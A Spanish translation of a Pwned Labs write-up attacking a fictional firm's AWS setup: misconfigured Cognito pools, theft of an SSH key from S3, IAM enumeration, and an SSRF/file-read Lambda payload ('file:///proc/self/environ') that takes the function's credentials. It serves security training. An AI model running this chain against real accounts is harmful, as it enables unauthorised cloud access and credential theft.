---
title: Abuso de Identity Pools y usuarios de Cognito
description: PWNED LABS
date: 2024-08-29
---

<Callout>
Este es el [LINK](https://pwnedlabs.io/labs/abuse-cognito-user-and-identity-pools) al laboratorio.
</Callout>

<Callout>
El contenido de este post es el mismo que el de Pwned Labs traducido al castellano.
</Callout>

## Escenario

Durante un pentest de seguridad externo de rutina en Huge Logistics, su equipo se topó con un repositorio público de git. No era un repositorio cualquiera; contenía el código fuente completo  de su nueva aplicación para Android. Podría ser simplemente el punto de entrada que necesita para acceder al entorno de nube más amplio de la empresa. El desafío ahora es examinar las
complejidades de la aplicación, identificar vulnerabilidades potenciales y ver si estas migas de pan conducen más profundamente al ámbito digital de Huge Logistics.  El perímetro es tu línea de partida; ¿Hasta dónde puedes llegar?

## Lo que aprenderas

- Explotar configuraciones permisivas en Identity Pools y usuarios de Amazon Cognito
- Ser capaz de identificar vulnerabilidades al revisar el código fuente.
- Explotar una función Lambda
- Comprender cómo se podría haber evitado esta cadena de exploits

## Realidad

Las configuraciones incorrectas o los ajustes permisivos en los grupos de identidades y usuarios
de AWS Cognito pueden permitir el acceso a recursos a los que no se debería acceder y pueden dar
lugar a que actores malintencionados puedan moverse lateral y verticalmente dentro de un
entorno de nube. La [investigación realizada en 2019](https://andresriancho.com/wp-content/uploads/2019/06/whitepaper-internet-scale-analysis-of-aws-cognito-security.pdf)
por Andrés Riancho identificó 2500 grupos de identidades de Cognito, que se utilizaron para
obtener acceso a más de 13000 depósitos S3 (que no están expuestos públicamente), 1200 tablas
de DynamoDB y 1500 funciones Lambda.

## Tutorial

Al utilizar Amazon Cognito, los desarrolladores pueden centrarse en la experiencia de la
aplicación en lugar de preocuparse por crear, proteger y escalar una solución para manejar
la administración de usuarios, la autenticación y la sincronización entre dispositivos.
Cognito consta principalmente de dos servicios principales:**User Pools** y **Federated
Identities (Identity Pools)**.

<Image
src="/images/blog/image.png"
width="748"
height="404"
alt="Image"
/>

1. El cliente se autentica en un grupo de usuarios.
2. El grupo de usuarios asigna tres tokens web JSON (JWT) a (Id, access y refresh).
3. El ID JWT se pasa al grupo de identidades y se elige una función a través de las
notificaciones JWT. Luego, el usuario recibe credenciales de IAM temporales con privilegios
que se basan en la función de IAM asignada al grupo al que pertenece ese usuario.
4. Luego, el usuario puede realizar llamadas a recursos de AWS según sus privilegios.

## Ataque

### Identity Pools

Al inspeccionar el código fuente filtrado, vemos una importación para `com.amazonaws.auth.CognitoCachingCredentialsProvider`.
Amazon Cognito es un servicio proporcionado por AWS que ofrece registro de usuario, inicio de sesión y control de acceso
simple y seguro a aplicaciones web y móviles. Se adapta a millones de usuarios y admite el inicio de sesión con cuentas
de redes sociales como Facebook, Google y Amazon, e identidades empresariales a través de SAML 2.0.
También vemos un ID de grupo de identidades de Cognito, así como una referencia a un depósito de S3 llamado hl-app-images .

<br/>

<Image
src="/images/blog/cognito12.png"
width="748"
height="404"
alt="Image"
/>

<Image
src="/images/blog/cognito13.png"
width="748"
height="404"
alt="Image"
/>

Amazon Cognito se puede configurar para admitir identidades no autenticadas, emitiendo credenciales de AWS
de corta duración para los usuarios que no se autentican con un proveedor de identidad, siempre que el solicitante
tenga un ID de identidad único válido. Podemos intentar solicitar una ID de identidad única proporcionando la ID
del grupo de identidades del código fuente.

<Callout>
Nota : Debe autenticarse con sus propias credenciales personales de AWS y
configurar la región en us-east-1 ya que es región es la que esta en el código.
</Callout>

```js
aws cognito-identity get-id --identity-pool-id 
us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign
```

- `aws cognito-identity get-id`: Este es el comando base de la AWS CLI para solicitar un ID de identidad de un
grupo de identidades en Amazon Cognito. Específicamente, get-id es una operación que devuelve un ID de identidad
único para un usuario autenticado o no autenticado en el grupo de identidades especificado.
- `-identity-pool-id`: es una opción obligatoria que especifica el ID del grupo de identidades de Cognito.
- `us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367`: El valor us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 es el
ID del grupo de identidades, que sigue el formato de region:GUID (en este caso, us-east-1 es la región,
y el GUID es un identificador único del pool).
- `-no-sign`: Esta opción le indica a AWS CLI que no firme la solicitud con credenciales de AWS.
Esto puede ser útil en situaciones donde no es necesario autenticar la solicitud, como cuando se solicita un
ID para un usuario no autenticado o cuando se realiza una prueba.

<Image
src="/images/blog/cognito1.png"
width="748"
height="404"
alt="Image"
/>

Tenemos una identificación de identidad. Solicitemos las credenciales para ello.

```js
aws cognito-identity get-credentials-for-identity 
--identity-id us-east-1:6391d33c-4b30-c088-b6fa-ae981fc516ae
--no-sign --region us-east-1
```

- `get-credentials-for-identity`: Este comando de AWS CLI solicita credenciales temporales para un usuario específico,
representado por un ID de identidad (identity-id) en un grupo de identidades de Amazon Cognito.

<Image
src="/images/blog/cognito2.png"
width="748"
height="404"
alt="Image"
/>

Tenemos credenciales, veamos si podemos ampliar nuestro acceso. Primero configure las key con aws configure y
luego configure el token con aws configure set aws_session_token `<token>`.
El comando `aws sts get-caller-identity` revela que hemos asumido el rol denominado `Cognito_StatusAppUnauth_Role` .

<br/>

<Image
src="/images/blog/cognito4.png"
width="748"
height="404"
alt="Image"
/>

<br/>

<Image
src="/images/blog/cognito5.png"
width="748"
height="404"
alt="Image"
/>

```js
aws sts get-caller-identity
```

- `aws sts get-caller-identity` se utiliza para obtener información sobre la identidad del usuario o rol que está ejecutando el comando. Es una forma de verificar quién es el usuario autenticado actualmente en AWS (Amazon Web Services). Es como el `whoami` de Cognito.

<Image
src="/images/blog/cognito14.png"
width="748"
height="404"
alt="Image"
/>

Podemos intentar ejecutar la automatización del proceso de enumeración de nuestros permisos en la cuenta de AWS utilizando [una herramienta como aws-enumerator](https://github.com/shabarkin/aws-enumerator) , pero esto no tiene éxito. Recordamos el depósito de S3 al que se hace referencia en el código fuente y lo enumeramos.

```js
aws s3 ls hl-app-images
aws s3 ls hl-app-images/temp/
aws s3 cp s3://hl-app-images/temp/id_rsa .
```

<Image
src="/images/blog/cognito7.png"
width="748"
height="404"
alt="Image"
/>

¡Esto revela una clave SSH! Con esta clave podemos intentar enumerar instancias EC2 u otros hosts identificados en la infraestructura de Huge Logistics e intentar ampliar nuestro acceso.

## Grupos de Usuarios (Users Pool)

Su equipo también identificó una interfaz de usuario alojada en Cognito expuesta públicamente para una aplicación web asociada con un grupo de usuarios de Cognito. La URL (así como el formulario) hace referencia al ID del cliente. `16f1g98bfuj9i0g3f8be36kkrl` .

https://huge-logistics.auth.us-east-1.amazoncognito.com/login?client_id=16f1g98bfuj9i0g3f8be36kkrl&response_type=code&scope=https%3A%2F%2Fapi.huge-logistics.com%2Fstatus+openid&redirect_uri=https%3A%2F%2Fhuge-logistics.com

<br/>

<Image
src="/images/blog/cognito8.png"
width="748"
height="404"
alt="Image"
/>

Podemos inferir del formulario de registro que el grupo de usuarios se ha configurado para aceptar el inicio de sesión con un nombre de usuario, por lo que sabemos que este es un atributo obligatorio al registrarse. Después de revisar [la documentación de AWS](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/sign-up.html) para sign-up En esta acción ingresamos los siguientes comandos, que se ejecutan correctamente una vez que cumplimos con la política de contraseña configurada.


```js
aws cognito-idp sign-up 
  --client-id 16f1g98bfuj9i0g3f8be36kkrl 
  --username test --password 'Password123!'
```
<br/>

<Image
src="/images/blog/cognito9.png"
width="748"
height="404"
alt="Image"
/>

<br/>

<Image
src="/images/blog/cognito10.png"
width="748"
height="404"
alt="Image"
/>

Después de revisar la documentación para la acción de inicio de autenticación, podemos emitir el siguiente comando para obtener un token web JSON (JWT). Sin embargo, esto no tiene éxito ya que los usuarios del grupo de usuarios de Cognito deben ser confirmados.

```js
aws cognito-idp initiate-auth 
--client-id 16f1g98bfuj9i0g3f8be36kkrl
--auth-flow USER_PASSWORD_AUTH 
--auth-parameters USERNAME=test,PASSWORD=Password123!
```

<Image
src="/images/blog/cognito15.png"
width="748"
height="404"
alt="Image"
/>

En caso de que la configuración recomendada por AWS de "Permitir que Cognito envíe mensajes automáticamente para verificar y confirmar" esté configurada, podemos intentar especificar un correo electrónico al que Cognito enviará automáticamente un código de verificación. 

```js
aws cognito-idp sign-up 
--client-id 16f1g98bfuj9i0g3f8be36kkrl 
--username p314d01
--password Password123! 
--user-attributes Name="email",Value="<email>" Name="name",Value="Test"
```

<Image
src="/images/blog/cognito16.png"
width="748"
height="404"
alt="Image"
/>

Se aceptó el registro de este nuevo usuario y recibimos un código de verificación. 

<Image
src="/images/blog/cognito17.png"
width="748"
height="404"
alt="Image"
/>

Podemos crear el siguiente comando para proporcionar el código y confirmar nuestra cuenta. Ejecutar este comando no se devuelve ningún resultado.

<Callout>
Nota : Deberá especificar un usuario único. 
</Callout>

```js
aws cognito-idp confirm-sign-up 
--client-id 16f1g98bfuj9i0g3f8be36kkrl 
--username test_user 
--confirmation-code 390494
```

Esta vez el initiate-auth ¡La acción es exitosa y obtenemos un JWT válido! Puede inspeccionar el JWT y decodificar los valores de los tokens individuales utilizando el sitio web https://jwt.io/ . 

```js 
aws cognito-idp initiate-auth 
--client-id 16f1g98bfuj9i0g3f8be36kkrl 
--auth-flow USER_PASSWORD_AUTH 
--auth-parameters USERNAME=p314do1,PASSWORD=Password123!
```

<Image
src="/images/blog/cognito18.png"
width="748"
height="404"
alt="Image"
/>

Los JWT se componen de JSON codificado en URL base64. Una estructura JSON comienza con `{`, que se traduce como "ey" cuando se codifica en base64. El encabezado JWT normalmente (aunque no siempre) comienza con `{"alg":...`, que luego se convierte en "eyJ" cuando se codifica.

Al decodificar el token de acceso en https://jwt.io vemos que iss (emisor de token) está configurado en https://cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz . Este es el ID del grupo de usuarios, con `8rcK7abtz` siendo un identificador único a nivel mundial. 

<Image
src="/images/blog/cognito19.png"
width="748"
height="404"
alt="Image"
/>

La emisión de JWT para usuarios autenticados en Amazon Cognito ofrece numerosas ventajas, incluidos flujos de trabajo de autenticación y autorización simplificados, escalabilidad, interoperabilidad con otros marcos y aplicaciones, y seguridad mejorada. Podemos utilizar este token para solicitar credenciales de AWS.

Emita el siguiente comando que especifica el get-id acción, copiando el token de acceso de IdToken y especificando el ID del grupo de usuarios. 

```js
aws cognito-identity get-id 
--identity-pool-id "us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367" 
--logins 
"{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<token>\" }"
```
<Image
src="/images/blog/cognito21.png"
width="748"
height="404"
alt="Image"
/>

<br />

<Image
src="/images/blog/cognito20.png"
width="748"
height="404"
alt="Image"
/>

Esto es exitoso y obtenemos la identificación de identidad única. `us-east-1:6391d33c-4ba1-c122-bc29-e1f3a70921dd`.

<Callout>
Nota : el ID de identidad en su instancia de laboratorio será diferente.
</Callout>

Ahora ejecute este comando que especifica el `get-credentials-for-identity` acción y el identificador único.

```js 
aws cognito-identity get-credentials-for-identity 
--identity-id us-east-1:ee941406-f70b-4ff3-8e3f-a9f2eb32454b 
--logins 
"{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<token>\" }"
```
<Image
src="/images/blog/cognito23.png"
width="748"
height="404"
alt="Image"
/>

<Image
src="/images/blog/cognito22.png"
width="748"
height="404"
alt="Image"
/>

¡Obtenemos credenciales de AWS! despues de correr aws configure para configurar las claves y aws configure set aws_session_token `<token>` para establecer el token, descubrimos que hemos asumido el rol Cognito_StatusAppAuth_Role. El rol que habíamos asumido anteriormente era Cognito_StatusAppNoauth_Role, ¿tal vez tengamos más permisos ahora? 

<Image
src="/images/blog/cognito25.png"
width="748"
height="404"
alt="Image"
/>

```js 
aws sts get-caller-identity
```

<Image
src="/images/blog/cognito26.png"
width="748"
height="404"
alt="Image"
/>

Al ejecutar el siguiente comando, vemos una política predeterminada administrada por AWS asociada con el rol. 

```js 
aws iam list-role-policies 
--role-name Cognito_StatusAppAuth_Role
```

<Image
src="/images/blog/cognito27.png"
width="748"
height="404"
alt="Image"
/>

Al enumerar las políticas de roles adjuntas (administradas por el cliente), vemos que el rol denominado Status está adjunto. 

```js 
aws iam list-attached-role-policies 
--role-name Cognito_StatusAppAuth_Role
```

<Image
src="/images/blog/cognito28.png"
width="748"
height="404"
alt="Image"
/>

Profundicemos. La ejecución del siguiente comando nos proporciona la versión de la política. 

```js 
aws iam get-policy 
--policy-arn arn:aws:iam::427648302155:policy/Status
```

<Image
src="/images/blog/cognito29.png"
width="748"
height="404"
alt="Image"
/>

Ahora ingrese este comando para recuperar el documento de política JSON.

```js 
aws iam get-policy-version 
--policy-arn arn:aws:iam::427648302155:policy/Status 
--version-id v4
```

Esto es interesante porque parece que tenemos permisos para enumerar todas las funciones de Lambda en la cuenta y también podemos recuperar el código de la función e invocarlo.

<Image
src="/images/blog/cognito30.png"
width="748"
height="404"
alt="Image"
/>

Ya tenemos un nombre de función pero podemos recuperar más información sobre las funciones disponibles con aws lambda list-functions. 

<Image
src="/images/blog/cognito31.png"
width="748"
height="404"
alt="Image"
/>

Sigamos enumerando `huge-logistics-status`.

```js
aws lambda get-function --function-name huge-logistics-status
```

<Image
src="/images/blog/cognito32.png"
width="748"
height="404"
alt="Image"
/>

Esto revela la configuración de la función a continuación, incluida la URL del paquete zip que contiene el código de la función.

```js
wget 'URL' -O huge-logistics-status.zip
```

Después de descomprimirlo vemos el código Python a continuación. El propósito de la función es verificar el estado de http://huge-logistics.com . Interesante desde una perspectiva de seguridad es que podemos invocar esta función Lambda con un event argumento que contiene una clave 'objetivo', estableciendo el target variable al valor asociado. Si 'objetivo' no está en el diccionario de eventos, target se establecerá en 'http://huge-logistics.com' por defecto. 


<Image
src="/images/blog/cognito33.png"
width="748"
height="404"
alt="Image"
/>

Esta función Lambda sufre vulnerabilidades de falsificación de solicitudes del lado del servidor (SSRF) y lectura arbitraria de archivos porque no se realiza ninguna validación en el parámetro target para garantizar que sea seguro y no un recurso interno. SSRF puede ser una vulnerabilidad más peligrosa si el servidor web es una instancia EC2; sin embargo, en este caso es un Lambda. Para leer archivos arbitrarios necesitaríamos especificar el file:// Esquema de URL. 

Primero invoquemos la función con el valor predeterminado.

```js 
aws lambda invoke --function-name huge-logistics-status response.json
```

<Image
src="/images/blog/cognito34.png"
width="748"
height="404"
alt="Image"
/>

Podemos validar la vulnerabilidad SSRF especificando otra URL.

```js
aws lambda invoke 
--function-name huge-logistics-status 
--payload '{ "target": "http://example.com" }' response.json
```


<Callout>
💡 Si está utilizando la versión 2 de AWS CLI, es posible que reciba el error Invalid base64: `{ "target": "http://example.com" }` al ejecutar este comando. En este caso, necesita codificar en base64 la carga útil con el parámetro --cli-binary-format raw-in-base64-out. El comando v2 completo se encuentra a continuación. Utilice este formato para las siguientes invocaciones de Lambda. 
</Callout>

```js
aws lambda invoke 
--cli-binary-format raw-in-base64-out 
--function-name huge-logistics-status 
--payload '{ "target": "http://example.com" }' response.json
```

<Image
src="/images/blog/cognito36.png"
width="748"
height="404"
alt="Image"
/>

Ahora intentemos explotar el archivo arbitrario leído. Una buena opción para nosotros en el contexto de AWS Lambda es /proc/self/environ ya que este archivo almacena variables de entorno, incluidas las credenciales de AWS utilizadas por la función.


```js
aws lambda invoke
--cli-binary-format raw-in-base64-out 
--function-name huge-logistics-status 
--payload '{ "target": "file:///proc/self/environ" }' response.json
```

<Image
src="/images/blog/cognito37.png"
width="748"
height="404"
alt="Image"
/>

Configure nuevamente las nuevas claves y el token. `aws sts get-caller-identity` revela nuestro nuevo contexto de ejecución. 

<Image
src="/images/blog/cognito38.png"
width="748"
height="404"
alt="Image"
/>

Dado que el depósito S3 estaba en el código de función, comencemos por ahí. La enumeración del depósito revela una carpeta temporal que contiene el plan de recuperación ante desastres de AWS para Huge Logistics.

<Image
src="/images/blog/cognito39.png"
width="748"
height="404"
alt="Image"
/>

<br/>

<Image
src="/images/blog/cognito40.png"
width="748"
height="404"
alt="Image"
/>

<br/>

<Image
src="/images/blog/cognito41.png"
width="748"
height="404"
alt="Image"
/>

Incluye la cuenta crítica de rotura de vidrio que permite el acceso a una cuenta de repuesto dinámico de AWS.

<Image
src="/images/blog/cognito42.png"
width="748"
height="404"
alt="Image"
/>

## Referencias

- [Flickr Account Takeover](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/)
- [Dow Jones Data Leak Results from an AWS Configuration Error](https://www.darkreading.com/cloud-security/dow-jones-data-leak-results-from-an-aws-configuration-error)
- [Internet-Scale analysis of AWS Cognito Security](https://andresriancho.com/wp-content/uploads/2019/06/whitepaper-internet-scale-analysis-of-aws-cognito-security.pdf)